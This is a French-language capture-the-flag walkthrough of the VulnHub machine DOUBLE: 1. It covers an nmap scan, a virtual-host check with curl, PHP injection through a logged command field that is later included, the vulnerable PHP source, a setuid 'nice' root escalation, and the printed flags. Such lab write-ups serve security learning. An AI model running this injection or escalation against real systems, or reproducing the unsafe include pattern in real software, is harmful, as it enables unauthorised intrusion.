# Solution du CTF DOUBLE de VulnHub

[DOUBLE: 1](https://vulnhub.com/entry/double-1,632/) est un CTF proposé par *foxlox* sur VulnHub.

```
Nmap scan report for 192.168.56.48
Host is up (0.00028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 deb52389bb9fd41ab50453d0b75cb03f (RSA)
|   256 160914eab9fa17e945395e3bb4fd110a (ECDSA)
|_  256 9f665e71b9125ded705a4f5a8d0d65d5 (ED25519)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: shredder.calipendu.la, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=shredder.calipendu.la
| Subject Alternative Name: DNS:shredder.calipendu.la
| Not valid before: 2020-10-10T14:59:42
|_Not valid after:  2030-10-08T14:59:42
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
8080/tcp open  http    Apache httpd 2.4.38
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=HU?
|_http-server-header: Apache/2.4.38 (Debian)
```

On voit que le certificat ratatché au port 25 correspond à un DNS spécifique.

Il convient peut être de rajouter une entrée dans notre fichier */etc/hosts* si jamais le serveur web utilise un hôte virtuel spécifique. On peut tester cela avec cURL en passant directement le bon entête :

```shellsession
$ curl -H "Host: shredder.calipendu.la" http://192.168.56.48/

<center>
<h2>SSCS 0.3b - Super Secure Command Send</h2>

<a href=/production>Production</a> - <a href=http://192.168.56.48:8080/>TEST</a>
```

On va donc rajouter l'entrée avant d'aller plus loin :)

Quand on suit le lien Production on arrive sur un formulaire demandant une commande ainsi qu'un code.

A la soumission on est redirigé vers une page avec ce qui semble être des lignes de log où je retrouve ma commande :

`2022-11-06 07:52:26-192.168.56.1 - ls`

Comme la saisie de commandes bash ne semble pas avoir d'inpact je tente de passer du code PHP (`<?php phpinfo(); ?>`)dans le champ commande et cette fois il semble bien exécuté (extrait du phpinfo affiché) :

| SERVER_SOFTWARE       | Apache/2.4.38 (Debian)                   |
| --------------------- | ---------------------------------------- |
| SERVER_NAME           | shredder.calipendu.la                    |
| SERVER_ADDR           | 192.168.56.48                            |
| SERVER_PORT           | 80                                       |
| REMOTE_ADDR           | 192.168.56.1                             |
| DOCUMENT_ROOT         | /var/www/html                            |
| REQUEST_SCHEME        | http                                     |
| CONTEXT_PREFIX        | *no value*                               |
| CONTEXT_DOCUMENT_ROOT | /var/www/html                            |
| SERVER_ADMIN          | webmaster@localhost                      |
| SCRIPT_FILENAME       | /var/www/html/production/sendcommand.php |

On réitère l'opération cette fois avec un appel à la fonction `system()` qui nous permettra d'uploader et exécuter un reverse-ssh.

Une fois dans la VM on peut lire le code PHP vulnérable :

```php
Ask to admin to update config: set production=1<br><br>
<hr>
<?php
$cmd=$_POST['command'];
$controlcode=$_POST['controlcode'];
$fd=fopen("out","a");
fputs($fd,date('Y-m-d h:i:s')."-".$_SERVER['REMOTE_ADDR']." - ".$cmd."\r\n");
fclose($fd);

ini_set("display_errors",1);
$out=$_GET['out'];
echo "<pre>";
include $out;
?>
```

A la racine web je trouve un dossier appartenant à l'utilisateur *fox* mais je n'ai pas les droits nécessaires pour y accéder :

```shellsession
www-data@double:/var/www/html$ ls
total 20
drwxr-xr-x 4 root     root     4096 Nov  2  2020 .
drwxr-xr-x 3 root     root     4096 Nov  2  2020 ..
-rw-r--r-- 1 root     root      184 Nov  2  2020 index.php
drwxr-xr-x 2 www-data www-data 4096 Nov  6 19:59 production
drwxr-x--- 2 fox      nogroup  4096 Nov  2  2020 wasedrcftgvybhujnmbvtgcr
www-data@double:/var/www/html$ ls wasedrcftgvybhujnmbvtgcr
ls: cannot open directory 'wasedrcftgvybhujnmbvtgcr': Permission denied
```

## This is nice

Je continue du fouiller. Le système ne dispose pas de sudo mais je remarque quelque chose d'anormal au niveau des finaires setuid. La commande *nice* ne devrait pas figurer dans cette liste. L'objectif de cet exécutable est de lancer un programme en spécifiant sa priorité d'exécution (du point de vue CPU). On peut donc l'exploiter pour lancer un shell avec euid 0 :

```shellsession
www-data@double:/var/www/html$ find / -type f -perm -u+s 2> /dev/null 
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/su
/usr/bin/nice
/usr/bin/chfn
/usr/sbin/chroot
/usr/sbin/chpasswd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@double:/var/www/html$ ls -al /usr/bin/nice
-rwsr-sr-x 1 root root 39552 Feb 28  2019 /usr/bin/nice
www-data@double:/var/www/html$ nice /bin/sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
proof.txt
# cat proof.txt 
c5315567687fe0e182bb87564ab54a7a
# cd /home/fox
# ls -al
total 24
drwxr-xr-x 2 fox  fox  4096 Dec  3  2020 .
drwxr-xr-x 4 root root 4096 Dec  3  2020 ..
lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 fox  fox   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 fox  fox  3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 fox  fox   807 Apr 18  2019 .profile
-rw------- 1 fox  fox    33 Dec  3  2020 local.txt
# cat local.txt
beef4039b5e78a23e80aa6560b93f429
```


